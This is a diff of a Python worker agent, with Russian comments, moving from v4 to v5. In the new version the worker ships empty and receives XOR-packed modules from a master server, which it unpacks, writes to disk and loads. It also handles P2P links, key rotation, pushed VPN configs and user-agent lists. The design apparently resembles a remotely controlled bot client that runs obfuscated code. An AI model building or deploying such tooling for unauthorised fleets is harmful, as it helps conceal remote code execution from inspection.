@@ -1,8 +1,7 @@
 """
-worker/agent.py — автономный воркер v4
-+ P2P full
-+ Key rotation
-+ Bootstrap key support
+worker/agent.py — автономный воркер v5
++ Принимает упакованные модули (unpack_module)
++ НЕ содержит модулей изначально
 """
 
 import asyncio
@@ -23,6 +22,7 @@ from shared.protocol import (
     MsgType, read_message, write_message,
     send_big_file, FileReceiver, CHUNK_SIZE,
 )
+from shared.module_pack import unpack_module, derive_xor_key
 
 from worker.loader import ModuleLoader
 from worker.executor import TaskExecutor
@@ -62,12 +62,9 @@ class WorkerAgent:
         self.password = (password or os.environ.get("LIVELIST_PASSWORD")
                           or "changeme-please")
         self.p2p_port = p2p_port
-
-        # Bootstrap key (опционально)
         self.bootstrap_pubkey = (bytes.fromhex(bootstrap_pubkey_hex)
                                   if bootstrap_pubkey_hex else None)
 
-        # Keys
         self.key_path = CONFIG / "worker_keys.json"
         if not self.key_path.exists():
             priv, pub = generate_keypair()
@@ -78,7 +75,6 @@ class WorkerAgent:
         self.loader = ModuleLoader(MODULES_DIR)
         self.executor = TaskExecutor(self.loader)
 
-        # P2P
         self.p2p = P2PNode(
             my_priv=self.static_priv,
             my_pub=self.static_pub,
@@ -91,20 +87,15 @@ class WorkerAgent:
         self.reconnect_delay = 5
         self.max_reconnect_delay = 300
 
-    # ═════════════════════════════════════════════════════════════════
-    # Main loop
-    # ═════════════════════════════════════════════════════════════════
-
     async def run(self):
         log.info("═" * 60)
-        log.info(f"Worker v4 | pub={self.static_pub.hex()[:16]}")
+        log.info(f"Worker v5 | pub={self.static_pub.hex()[:16]}")
         log.info(f"Master: {self.master_addr}")
         log.info(f"WG: {self.wg_addr}  P2P: {self.p2p_port}")
         log.info(f"Bootstrap: {'ON' if self.bootstrap_pubkey else 'OFF'}")
         log.info(f"Modules: {self.loader.list_modules()}")
         log.info("═" * 60)
 
-        # Start P2P server
         try:
             await self.p2p.start_server()
         except Exception as e:
@@ -149,13 +140,12 @@ class WorkerAgent:
         log.info("Handshake OK")
         self.reconnect_delay = 5
 
-        # Регистрация
         await write_message(writer, channel, MsgType.STATUS, {
             "state": "online",
             "wg_addr": self.wg_addr,
             "p2p_port": self.p2p_port,
             "modules": self.loader.list_modules(),
-            "version": "4.0",
+            "version": "5.0",
             "started_at": int(time.time()),
         })
 
@@ -195,31 +185,38 @@ class WorkerAgent:
                 await write_message(writer, channel, MsgType.PONG)
 
             elif msg_type == MsgType.PUSH_MODULE:
-                await self._handle_module(writer, channel, header, body)
+                # Одиночный модуль
+                module_name = header["module"]
+                await self._unpack_and_load(writer, channel,
+                                             module_name, body)
 
             elif msg_type == MsgType.MODULE_CHUNK_START:
                 fn = header["filename"]
-                receivers[fn] = FileReceiver(MODULES_DIR / fn)
-                receivers[fn].start(header)
+                receivers[fn] = {
+                    "buffer": bytearray(),
+                    "module": header.get("module") or fn.replace(".py", ""),
+                }
 
             elif msg_type == MsgType.MODULE_CHUNK_CHUNK:
                 fn = header["filename"]
                 if fn in receivers:
-                    receivers[fn].chunk(header, body)
+                    receivers[fn]["buffer"].extend(body)
 
             elif msg_type == MsgType.MODULE_CHUNK_DONE:
                 fn = header["filename"]
                 if fn in receivers:
-                    size = receivers[fn].finish(header)
+                    packed = bytes(receivers[fn]["buffer"])
+                    module_name = receivers[fn]["module"]
                     del receivers[fn]
-                    await self._module_loaded(writer, channel, fn, size)
+                    await self._unpack_and_load(writer, channel,
+                                                 module_name, packed)
 
             elif msg_type == MsgType.PUSH_VPN:
                 await self._handle_vpn(writer, channel, header, body)
 
             elif msg_type == MsgType.PUSH_UA:
                 (BASE / "ua_json.json").write_bytes(body)
-                log.info(f"UA updated")
+                log.info("UA updated")
 
             elif msg_type == MsgType.RUN_TASK:
                 asyncio.create_task(
@@ -232,13 +229,9 @@ class WorkerAgent:
                     "module": "*", "state": "reloaded",
                 })
 
-            # ═══ P2P ═══
             elif msg_type == MsgType.P2P_CONNECT:
-                asyncio.create_task(
-                    self._handle_p2p_connect(header)
-                )
+                asyncio.create_task(self._handle_p2p_connect(header))
 
-            # ═══ KEY ROTATION ═══
             elif msg_type == MsgType.KEY_ROTATE_REQUEST:
                 await self._handle_key_rotate_request(writer, channel)
 
@@ -251,104 +244,55 @@ class WorkerAgent:
                 return
 
     # ═════════════════════════════════════════════════════════════════
-    # P2P handler
+    # MODULE unpack + load
     # ═════════════════════════════════════════════════════════════════
 
-    async def _handle_p2p_connect(self, header):
-        peer_pub = header.get("peer_pub")
-        peer_host = header.get("peer_host")
-        peer_port = header.get("peer_port")
-        role = header.get("role", "listener")
+    async def _unpack_and_load(self, writer, channel, module_name, packed):
+        """
+        1. Derive XOR key
+        2. Unpack (verify SHA + size + magic)
+        3. Write .py
+        4. Load
+        5. Ack
+        """
+        if not channel.shared_secret:
+            log.error("Channel без shared_secret")
+            await write_message(writer, channel, MsgType.MODULE_ACK, {
+                "module": module_name, "state": "error",
+                "error": "no shared_secret",
+            })
+            return False
 
-        log.info(f"[P2P] command: {role} → {peer_pub[:16]} "
-                  f"@ {peer_host}:{peer_port}")
+        try:
+            xor_key = derive_xor_key(channel.shared_secret, module_name)
+            name, source = unpack_module(packed, xor_key)
+        except Exception as e:
+            log.error(f"Unpack {module_name}: {e}")
+            await write_message(writer, channel, MsgType.MODULE_ACK, {
+                "module": module_name, "state": "error",
+                "error": str(e),
+            })
+            return False
 
-        if role == "initiator":
-            if peer_host in ("?", "", None):
-                log.warning("[P2P] initiator without host — skip")
-                return
-            # Небольшая задержка, чтобы listener уже был готов
-            await asyncio.sleep(2)
-            await self.p2p.connect_to_peer(peer_host, peer_port, peer_pub)
-        else:
-            # Listener — просто добавляем в allowed, ждём подключения
-            try:
-                self.p2p.allowed_peers.add(bytes.fromhex(peer_pub))
-            except Exception:
-                pass
-            log.info(f"[P2P] awaiting incoming from {peer_pub[:16]}")
+        # Записываем .py
+        filepath = MODULES_DIR / f"{name}.py"
+        filepath.write_bytes(source)
+        log.info(f"Unpacked: {name} ({len(source)} bytes) → {filepath.name}")
 
-    async def _on_p2p_data(self, peer_pub_hex, msg_type, header, body):
-        """Callback для входящих P2P сообщений."""
-        log.info(f"[P2P] data from {peer_pub_hex[:16]}: {msg_type}")
-        if msg_type == MsgType.P2P_DATA:
-            payload = body.decode(errors="replace")
-            log.info(f"[P2P] payload ({len(payload)} bytes): "
-                      f"{payload[:100]}")
-
-    # ═════════════════════════════════════════════════════════════════
-    # Key rotation
-    # ═════════════════════════════════════════════════════════════════
-
-    async def _handle_key_rotate_request(self, writer, channel):
-        log.info("[KEY] rotate requested — generating new keypair")
-        old_priv, old_pub, new_priv, new_pub = rotate_keypair(
-            self.key_path, KEYS_BACKUP
-        )
-        # Обновляем в памяти
-        self.static_priv = new_priv
-        self.static_pub = new_pub
-
-        # Обновляем P2P (использует те же ключи)
-        self.p2p.my_priv = new_priv
-        self.p2p.my_pub = new_pub
-
-        # Отправляем мастеру новый pubkey
-        await write_message(writer, channel, MsgType.KEY_ROTATE_NEW, {
-            "new_pub": new_pub.hex(),
-            "old_pub": old_pub.hex(),
-        })
-        log.info(f"[KEY] sent new pubkey: {new_pub.hex()[:16]}")
-
-    async def _handle_key_rotate_ack(self, writer, channel, header):
-        new_master_pub_hex = header.get("new_pub")
-        if new_master_pub_hex:
-            self.master_pubkey = bytes.fromhex(new_master_pub_hex)
-            log.info(f"[KEY] master rotated to "
-                      f"{new_master_pub_hex[:16]}")
-
-            # Сохраняем для будущих соединений
-            master_key_file = CONFIG / "master_pubkey.txt"
-            master_key_file.write_text(new_master_pub_hex)
-
-        # Подтверждаем
-        await write_message(writer, channel, MsgType.KEY_ROTATE_DONE, {
-            "state": "acknowledged",
-        })
-        log.info("[KEY] rotation confirmed")
-
-    # ═════════════════════════════════════════════════════════════════
-    # Other handlers
-    # ═════════════════════════════════════════════════════════════════
-
-    async def _handle_module(self, writer, channel, header, body):
-        name = header["module"]
-        filename = header.get("filename", f"{name}.py")
-        (MODULES_DIR / filename).write_bytes(body)
-        await self._module_loaded(writer, channel, filename, len(body))
-
-    async def _module_loaded(self, writer, channel, filename, size):
-        name = filename.replace(".py", "")
+        # Загружаем
         try:
             self.loader.load_module(name)
             await write_message(writer, channel, MsgType.MODULE_ACK, {
-                "module": name, "state": "loaded",
+                "module": name, "state": "loaded", "size": len(source),
             })
-            log.info(f"Module loaded: {name} ({size} bytes)")
+            log.info(f"Module loaded: {name}")
+            return True
         except Exception as e:
+            log.error(f"Load {name}: {e}")
             await write_message(writer, channel, MsgType.MODULE_ACK, {
                 "module": name, "state": "error", "error": str(e),
             })
+            return False
 
     async def _handle_vpn(self, writer, channel, header, body):
         filename = header.get("filename", "wg-new.conf")
@@ -366,6 +310,63 @@ class WorkerAgent:
             log.info(f"VPN installed: {filename}")
         except Exception as e:
             log.error(f"VPN install: {e}")
+
+    # ═════════════════════════════════════════════════════════════════
+    # P2P
+    # ═════════════════════════════════════════════════════════════════
+
+    async def _handle_p2p_connect(self, header):
+        peer_pub = header.get("peer_pub")
+        peer_host = header.get("peer_host")
+        peer_port = header.get("peer_port")
+        role = header.get("role", "listener")
+        log.info(f"[P2P] {role} → {peer_pub[:16]} @ {peer_host}:{peer_port}")
+        if role == "initiator":
+            if peer_host in ("?", "", None):
+                log.warning("[P2P] initiator without host")
+                return
+            await asyncio.sleep(2)
+            await self.p2p.connect_to_peer(peer_host, peer_port, peer_pub)
+        else:
+            try:
+                self.p2p.allowed_peers.add(bytes.fromhex(peer_pub))
+            except Exception:
+                pass
+
+    async def _on_p2p_data(self, peer_pub_hex, msg_type, header, body):
+        log.info(f"[P2P] {peer_pub_hex[:16]}: {msg_type}")
+
+    # ═════════════════════════════════════════════════════════════════
+    # Key rotation
+    # ═════════════════════════════════════════════════════════════════
+
+    async def _handle_key_rotate_request(self, writer, channel):
+        log.info("[KEY] rotate requested")
+        old_priv, old_pub, new_priv, new_pub = rotate_keypair(
+            self.key_path, KEYS_BACKUP
+        )
+        self.static_priv = new_priv
+        self.static_pub = new_pub
+        self.p2p.my_priv = new_priv
+        self.p2p.my_pub = new_pub
+        await write_message(writer, channel, MsgType.KEY_ROTATE_NEW, {
+            "new_pub": new_pub.hex(),
+            "old_pub": old_pub.hex(),
+        })
+
+    async def _handle_key_rotate_ack(self, writer, channel, header):
+        new_master_pub_hex = header.get("new_pub")
+        if new_master_pub_hex:
+            self.master_pubkey = bytes.fromhex(new_master_pub_hex)
+            (CONFIG / "master_pubkey.txt").write_text(new_master_pub_hex)
+            log.info(f"[KEY] master rotated: {new_master_pub_hex[:16]}")
+        await write_message(writer, channel, MsgType.KEY_ROTATE_DONE, {
+            "state": "acknowledged",
+        })
+
+    # ═════════════════════════════════════════════════════════════════
+    # Tasks
+    # ═════════════════════════════════════════════════════════════════
 
     async def _handle_task(self, writer, channel, header, body):
         task_id = header["task_id"]
@@ -390,7 +391,7 @@ class WorkerAgent:
                 )
 
             (TASKS_CACHE / f"{task_id}.json").write_bytes(result_bytes)
-            log.info(f"Task {task_id} done")
+            log.info(f"Task {task_id} done ({len(result_bytes)} bytes)")
 
         except Exception as e:
             log.error(f"Task {task_id}: {e}", exc_info=True)
